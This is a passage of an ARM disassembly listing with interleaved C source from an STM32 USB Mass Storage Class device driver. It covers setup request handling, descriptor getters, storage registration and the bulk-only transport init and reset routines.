 8008f50:	08008fa9 	.word	0x08008fa9
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008f54:	687b      	ldr	r3, [r7, #4]
 8008f56:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008f5a:	b2db      	uxtb	r3, r3
 8008f5c:	2b03      	cmp	r3, #3
 8008f5e:	d107      	bne.n	8008f70 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008f60:	f107 030e 	add.w	r3, r7, #14
 8008f64:	2202      	movs	r2, #2
 8008f66:	4619      	mov	r1, r3
 8008f68:	6878      	ldr	r0, [r7, #4]
 8008f6a:	f003 f923 	bl	800c1b4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008f6e:	e050      	b.n	8009012 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8008f70:	6839      	ldr	r1, [r7, #0]
 8008f72:	6878      	ldr	r0, [r7, #4]
 8008f74:	f003 f8ad 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008f78:	2303      	movs	r3, #3
 8008f7a:	75fb      	strb	r3, [r7, #23]
          break;
 8008f7c:	e049      	b.n	8009012 <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008f7e:	687b      	ldr	r3, [r7, #4]
 8008f80:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008f84:	b2db      	uxtb	r3, r3
 8008f86:	2b03      	cmp	r3, #3
 8008f88:	d107      	bne.n	8008f9a <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 8008f8a:	693b      	ldr	r3, [r7, #16]
 8008f8c:	3304      	adds	r3, #4
 8008f8e:	2201      	movs	r2, #1
 8008f90:	4619      	mov	r1, r3
 8008f92:	6878      	ldr	r0, [r7, #4]
 8008f94:	f003 f90e 	bl	800c1b4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008f98:	e03b      	b.n	8009012 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8008f9a:	6839      	ldr	r1, [r7, #0]
 8008f9c:	6878      	ldr	r0, [r7, #4]
 8008f9e:	f003 f898 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008fa2:	2303      	movs	r3, #3
 8008fa4:	75fb      	strb	r3, [r7, #23]
          break;
 8008fa6:	e034      	b.n	8009012 <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008fa8:	687b      	ldr	r3, [r7, #4]
 8008faa:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008fae:	b2db      	uxtb	r3, r3
 8008fb0:	2b03      	cmp	r3, #3
 8008fb2:	d106      	bne.n	8008fc2 <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 8008fb4:	683b      	ldr	r3, [r7, #0]
 8008fb6:	885b      	ldrh	r3, [r3, #2]
 8008fb8:	b2db      	uxtb	r3, r3
 8008fba:	461a      	mov	r2, r3
 8008fbc:	693b      	ldr	r3, [r7, #16]
 8008fbe:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008fc0:	e027      	b.n	8009012 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8008fc2:	6839      	ldr	r1, [r7, #0]
 8008fc4:	6878      	ldr	r0, [r7, #4]
 8008fc6:	f003 f884 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008fca:	2303      	movs	r3, #3
 8008fcc:	75fb      	strb	r3, [r7, #23]
          break;
 8008fce:	e020      	b.n	8009012 <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008fd0:	687b      	ldr	r3, [r7, #4]
 8008fd2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008fd6:	b2db      	uxtb	r3, r3
 8008fd8:	2b03      	cmp	r3, #3
 8008fda:	d119      	bne.n	8009010 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 8008fdc:	683b      	ldr	r3, [r7, #0]
 8008fde:	885b      	ldrh	r3, [r3, #2]
 8008fe0:	2b00      	cmp	r3, #0
 8008fe2:	d115      	bne.n	8009010 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 8008fe4:	683b      	ldr	r3, [r7, #0]
 8008fe6:	889b      	ldrh	r3, [r3, #4]
 8008fe8:	b2db      	uxtb	r3, r3
 8008fea:	4619      	mov	r1, r3
 8008fec:	6878      	ldr	r0, [r7, #4]
 8008fee:	f003 fdad 	bl	800cb4c <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 8008ff2:	683b      	ldr	r3, [r7, #0]
 8008ff4:	889b      	ldrh	r3, [r3, #4]
 8008ff6:	b2db      	uxtb	r3, r3
 8008ff8:	4619      	mov	r1, r3
 8008ffa:	6878      	ldr	r0, [r7, #4]
 8008ffc:	f000 fb54 	bl	80096a8 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 8009000:	e006      	b.n	8009010 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 8009002:	6839      	ldr	r1, [r7, #0]
 8009004:	6878      	ldr	r0, [r7, #4]
 8009006:	f003 f864 	bl	800c0d2 <USBD_CtlError>
          ret = USBD_FAIL;
 800900a:	2303      	movs	r3, #3
 800900c:	75fb      	strb	r3, [r7, #23]
          break;
 800900e:	e000      	b.n	8009012 <USBD_MSC_Setup+0x1de>
          break;
 8009010:	bf00      	nop
      }
      break;
 8009012:	e006      	b.n	8009022 <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 8009014:	6839      	ldr	r1, [r7, #0]
 8009016:	6878      	ldr	r0, [r7, #4]
 8009018:	f003 f85b 	bl	800c0d2 <USBD_CtlError>
      ret = USBD_FAIL;
 800901c:	2303      	movs	r3, #3
 800901e:	75fb      	strb	r3, [r7, #23]
      break;
 8009020:	bf00      	nop
  }

  return (uint8_t)ret;
 8009022:	7dfb      	ldrb	r3, [r7, #23]
}
 8009024:	4618      	mov	r0, r3
 8009026:	3718      	adds	r7, #24
 8009028:	46bd      	mov	sp, r7
 800902a:	bd80      	pop	{r7, pc}

0800902c <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800902c:	b580      	push	{r7, lr}
 800902e:	b082      	sub	sp, #8
 8009030:	af00      	add	r7, sp, #0
 8009032:	6078      	str	r0, [r7, #4]
 8009034:	460b      	mov	r3, r1
 8009036:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 8009038:	78fb      	ldrb	r3, [r7, #3]
 800903a:	4619      	mov	r1, r3
 800903c:	6878      	ldr	r0, [r7, #4]
 800903e:	f000 f961 	bl	8009304 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 8009042:	2300      	movs	r3, #0
}
 8009044:	4618      	mov	r0, r3
 8009046:	3708      	adds	r7, #8
 8009048:	46bd      	mov	sp, r7
 800904a:	bd80      	pop	{r7, pc}

0800904c <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800904c:	b580      	push	{r7, lr}
 800904e:	b082      	sub	sp, #8
 8009050:	af00      	add	r7, sp, #0
 8009052:	6078      	str	r0, [r7, #4]
 8009054:	460b      	mov	r3, r1
 8009056:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 8009058:	78fb      	ldrb	r3, [r7, #3]
 800905a:	4619      	mov	r1, r3
 800905c:	6878      	ldr	r0, [r7, #4]
 800905e:	f000 f98d 	bl	800937c <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 8009062:	2300      	movs	r3, #0
}
 8009064:	4618      	mov	r0, r3
 8009066:	3708      	adds	r7, #8
 8009068:	46bd      	mov	sp, r7
 800906a:	bd80      	pop	{r7, pc}

0800906c <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 800906c:	b580      	push	{r7, lr}
 800906e:	b084      	sub	sp, #16
 8009070:	af00      	add	r7, sp, #0
 8009072:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009074:	2181      	movs	r1, #129	; 0x81
 8009076:	4812      	ldr	r0, [pc, #72]	; (80090c0 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009078:	f002 f9c8 	bl	800b40c <USBD_GetEpDesc>
 800907c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800907e:	2101      	movs	r1, #1
 8009080:	480f      	ldr	r0, [pc, #60]	; (80090c0 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009082:	f002 f9c3 	bl	800b40c <USBD_GetEpDesc>
 8009086:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009088:	68fb      	ldr	r3, [r7, #12]
 800908a:	2b00      	cmp	r3, #0
 800908c:	d006      	beq.n	800909c <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800908e:	68fb      	ldr	r3, [r7, #12]
 8009090:	2200      	movs	r2, #0
 8009092:	711a      	strb	r2, [r3, #4]
 8009094:	2200      	movs	r2, #0
 8009096:	f042 0202 	orr.w	r2, r2, #2
 800909a:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 800909c:	68bb      	ldr	r3, [r7, #8]
 800909e:	2b00      	cmp	r3, #0
 80090a0:	d006      	beq.n	80090b0 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 80090a2:	68bb      	ldr	r3, [r7, #8]
 80090a4:	2200      	movs	r2, #0
 80090a6:	711a      	strb	r2, [r3, #4]
 80090a8:	2200      	movs	r2, #0
 80090aa:	f042 0202 	orr.w	r2, r2, #2
 80090ae:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80090b0:	687b      	ldr	r3, [r7, #4]
 80090b2:	2220      	movs	r2, #32
 80090b4:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80090b6:	4b02      	ldr	r3, [pc, #8]	; (80090c0 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 80090b8:	4618      	mov	r0, r3
 80090ba:	3710      	adds	r7, #16
 80090bc:	46bd      	mov	sp, r7
 80090be:	bd80      	pop	{r7, pc}
 80090c0:	200000e0 	.word	0x200000e0

080090c4 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 80090c4:	b580      	push	{r7, lr}
 80090c6:	b084      	sub	sp, #16
 80090c8:	af00      	add	r7, sp, #0
 80090ca:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80090cc:	2181      	movs	r1, #129	; 0x81
 80090ce:	4812      	ldr	r0, [pc, #72]	; (8009118 <USBD_MSC_GetFSCfgDesc+0x54>)
 80090d0:	f002 f99c 	bl	800b40c <USBD_GetEpDesc>
 80090d4:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80090d6:	2101      	movs	r1, #1
 80090d8:	480f      	ldr	r0, [pc, #60]	; (8009118 <USBD_MSC_GetFSCfgDesc+0x54>)
 80090da:	f002 f997 	bl	800b40c <USBD_GetEpDesc>
 80090de:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80090e0:	68fb      	ldr	r3, [r7, #12]
 80090e2:	2b00      	cmp	r3, #0
 80090e4:	d006      	beq.n	80090f4 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80090e6:	68fb      	ldr	r3, [r7, #12]
 80090e8:	2200      	movs	r2, #0
 80090ea:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80090ee:	711a      	strb	r2, [r3, #4]
 80090f0:	2200      	movs	r2, #0
 80090f2:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80090f4:	68bb      	ldr	r3, [r7, #8]
 80090f6:	2b00      	cmp	r3, #0
 80090f8:	d006      	beq.n	8009108 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80090fa:	68bb      	ldr	r3, [r7, #8]
 80090fc:	2200      	movs	r2, #0
 80090fe:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009102:	711a      	strb	r2, [r3, #4]
 8009104:	2200      	movs	r2, #0
 8009106:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009108:	687b      	ldr	r3, [r7, #4]
 800910a:	2220      	movs	r2, #32
 800910c:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800910e:	4b02      	ldr	r3, [pc, #8]	; (8009118 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 8009110:	4618      	mov	r0, r3
 8009112:	3710      	adds	r7, #16
 8009114:	46bd      	mov	sp, r7
 8009116:	bd80      	pop	{r7, pc}
 8009118:	200000e0 	.word	0x200000e0

0800911c <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 800911c:	b580      	push	{r7, lr}
 800911e:	b084      	sub	sp, #16
 8009120:	af00      	add	r7, sp, #0
 8009122:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009124:	2181      	movs	r1, #129	; 0x81
 8009126:	4812      	ldr	r0, [pc, #72]	; (8009170 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009128:	f002 f970 	bl	800b40c <USBD_GetEpDesc>
 800912c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800912e:	2101      	movs	r1, #1
 8009130:	480f      	ldr	r0, [pc, #60]	; (8009170 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009132:	f002 f96b 	bl	800b40c <USBD_GetEpDesc>
 8009136:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009138:	68fb      	ldr	r3, [r7, #12]
 800913a:	2b00      	cmp	r3, #0
 800913c:	d006      	beq.n	800914c <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800913e:	68fb      	ldr	r3, [r7, #12]
 8009140:	2200      	movs	r2, #0
 8009142:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009146:	711a      	strb	r2, [r3, #4]
 8009148:	2200      	movs	r2, #0
 800914a:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 800914c:	68bb      	ldr	r3, [r7, #8]
 800914e:	2b00      	cmp	r3, #0
 8009150:	d006      	beq.n	8009160 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009152:	68bb      	ldr	r3, [r7, #8]
 8009154:	2200      	movs	r2, #0
 8009156:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800915a:	711a      	strb	r2, [r3, #4]
 800915c:	2200      	movs	r2, #0
 800915e:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009160:	687b      	ldr	r3, [r7, #4]
 8009162:	2220      	movs	r2, #32
 8009164:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009166:	4b02      	ldr	r3, [pc, #8]	; (8009170 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 8009168:	4618      	mov	r0, r3
 800916a:	3710      	adds	r7, #16
 800916c:	46bd      	mov	sp, r7
 800916e:	bd80      	pop	{r7, pc}
 8009170:	200000e0 	.word	0x200000e0

08009174 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 8009174:	b480      	push	{r7}
 8009176:	b083      	sub	sp, #12
 8009178:	af00      	add	r7, sp, #0
 800917a:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 800917c:	687b      	ldr	r3, [r7, #4]
 800917e:	220a      	movs	r2, #10
 8009180:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 8009182:	4b03      	ldr	r3, [pc, #12]	; (8009190 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 8009184:	4618      	mov	r0, r3
 8009186:	370c      	adds	r7, #12
 8009188:	46bd      	mov	sp, r7
 800918a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800918e:	4770      	bx	lr
 8009190:	20000100 	.word	0x20000100

08009194 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 8009194:	b480      	push	{r7}
 8009196:	b083      	sub	sp, #12
 8009198:	af00      	add	r7, sp, #0
 800919a:	6078      	str	r0, [r7, #4]
 800919c:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 800919e:	683b      	ldr	r3, [r7, #0]
 80091a0:	2b00      	cmp	r3, #0
 80091a2:	d101      	bne.n	80091a8 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 80091a4:	2303      	movs	r3, #3
 80091a6:	e009      	b.n	80091bc <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 80091a8:	687b      	ldr	r3, [r7, #4]
 80091aa:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80091ae:	687a      	ldr	r2, [r7, #4]
 80091b0:	33b0      	adds	r3, #176	; 0xb0
 80091b2:	009b      	lsls	r3, r3, #2
 80091b4:	4413      	add	r3, r2
 80091b6:	683a      	ldr	r2, [r7, #0]
 80091b8:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 80091ba:	2300      	movs	r3, #0
}
 80091bc:	4618      	mov	r0, r3
 80091be:	370c      	adds	r7, #12
 80091c0:	46bd      	mov	sp, r7
 80091c2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80091c6:	4770      	bx	lr

080091c8 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 80091c8:	b580      	push	{r7, lr}
 80091ca:	b084      	sub	sp, #16
 80091cc:	af00      	add	r7, sp, #0
 80091ce:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80091d0:	687b      	ldr	r3, [r7, #4]
 80091d2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80091d6:	687b      	ldr	r3, [r7, #4]
 80091d8:	32b0      	adds	r2, #176	; 0xb0
 80091da:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80091de:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80091e0:	68fb      	ldr	r3, [r7, #12]
 80091e2:	2b00      	cmp	r3, #0
 80091e4:	d039      	beq.n	800925a <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 80091e6:	68fb      	ldr	r3, [r7, #12]
 80091e8:	2200      	movs	r2, #0
 80091ea:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 80091ec:	68fb      	ldr	r3, [r7, #12]
 80091ee:	2200      	movs	r2, #0
 80091f0:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 80091f2:	68fb      	ldr	r3, [r7, #12]
 80091f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80091f8:	2200      	movs	r2, #0
 80091fa:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 80091fe:	68fb      	ldr	r3, [r7, #12]
 8009200:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009204:	2200      	movs	r2, #0
 8009206:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800920a:	68fb      	ldr	r3, [r7, #12]
 800920c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009210:	2200      	movs	r2, #0
 8009212:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 8009216:	687b      	ldr	r3, [r7, #4]
 8009218:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800921c:	687a      	ldr	r2, [r7, #4]
 800921e:	33b0      	adds	r3, #176	; 0xb0
 8009220:	009b      	lsls	r3, r3, #2
 8009222:	4413      	add	r3, r2
 8009224:	685b      	ldr	r3, [r3, #4]
 8009226:	681b      	ldr	r3, [r3, #0]
 8009228:	2000      	movs	r0, #0
 800922a:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 800922c:	4b0d      	ldr	r3, [pc, #52]	; (8009264 <MSC_BOT_Init+0x9c>)
 800922e:	781b      	ldrb	r3, [r3, #0]
 8009230:	4619      	mov	r1, r3
 8009232:	6878      	ldr	r0, [r7, #4]
 8009234:	f003 fc8a 	bl	800cb4c <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 8009238:	4b0b      	ldr	r3, [pc, #44]	; (8009268 <MSC_BOT_Init+0xa0>)
 800923a:	781b      	ldrb	r3, [r3, #0]
 800923c:	4619      	mov	r1, r3
 800923e:	6878      	ldr	r0, [r7, #4]
 8009240:	f003 fc84 	bl	800cb4c <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009244:	4b07      	ldr	r3, [pc, #28]	; (8009264 <MSC_BOT_Init+0x9c>)
 8009246:	7819      	ldrb	r1, [r3, #0]
 8009248:	68fb      	ldr	r3, [r7, #12]
 800924a:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 800924e:	3210      	adds	r2, #16
 8009250:	231f      	movs	r3, #31
 8009252:	6878      	ldr	r0, [r7, #4]
 8009254:	f003 fdb8 	bl	800cdc8 <USBD_LL_PrepareReceive>
 8009258:	e000      	b.n	800925c <MSC_BOT_Init+0x94>
    return;
 800925a:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800925c:	3710      	adds	r7, #16
 800925e:	46bd      	mov	sp, r7
 8009260:	bd80      	pop	{r7, pc}
 8009262:	bf00      	nop
 8009264:	2000010b 	.word	0x2000010b
 8009268:	2000010a 	.word	0x2000010a

0800926c <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 800926c:	b580      	push	{r7, lr}
 800926e:	b084      	sub	sp, #16
 8009270:	af00      	add	r7, sp, #0
 8009272:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009274:	687b      	ldr	r3, [r7, #4]
 8009276:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800927a:	687b      	ldr	r3, [r7, #4]
 800927c:	32b0      	adds	r2, #176	; 0xb0
 800927e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009282:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009284:	68fb      	ldr	r3, [r7, #12]
 8009286:	2b00      	cmp	r3, #0
 8009288:	d01c      	beq.n	80092c4 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 800928a:	68fb      	ldr	r3, [r7, #12]
 800928c:	2200      	movs	r2, #0
 800928e:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 8009290:	68fb      	ldr	r3, [r7, #12]
 8009292:	2201      	movs	r2, #1
 8009294:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 8009296:	4b0d      	ldr	r3, [pc, #52]	; (80092cc <MSC_BOT_Reset+0x60>)
 8009298:	781b      	ldrb	r3, [r3, #0]
 800929a:	4619      	mov	r1, r3
 800929c:	6878      	ldr	r0, [r7, #4]
 800929e:	f003 fcc1 	bl	800cc24 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 80092a2:	4b0b      	ldr	r3, [pc, #44]	; (80092d0 <MSC_BOT_Reset+0x64>)
 80092a4:	781b      	ldrb	r3, [r3, #0]
 80092a6:	4619      	mov	r1, r3
 80092a8:	6878      	ldr	r0, [r7, #4]
 80092aa:	f003 fcbb 	bl	800cc24 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80092ae:	4b08      	ldr	r3, [pc, #32]	; (80092d0 <MSC_BOT_Reset+0x64>)
 80092b0:	7819      	ldrb	r1, [r3, #0]
 80092b2:	68fb      	ldr	r3, [r7, #12]
 80092b4:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80092b8:	3210      	adds	r2, #16
 80092ba:	231f      	movs	r3, #31
 80092bc:	6878      	ldr	r0, [r7, #4]
 80092be:	f003 fd83 	bl	800cdc8 <USBD_LL_PrepareReceive>
 80092c2:	e000      	b.n	80092c6 <MSC_BOT_Reset+0x5a>
    return;
 80092c4:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80092c6:	3710      	adds	r7, #16
 80092c8:	46bd      	mov	sp, r7
 80092ca:	bd80      	pop	{r7, pc}
 80092cc:	2000010a 	.word	0x2000010a
 80092d0:	2000010b 	.word	0x2000010b

080092d4 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 80092d4:	b480      	push	{r7}
 80092d6:	b085      	sub	sp, #20
 80092d8:	af00      	add	r7, sp, #0
 80092da:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80092dc:	687b      	ldr	r3, [r7, #4]
 80092de:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80092e2:	687b      	ldr	r3, [r7, #4]
 80092e4:	32b0      	adds	r2, #176	; 0xb0
 80092e6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
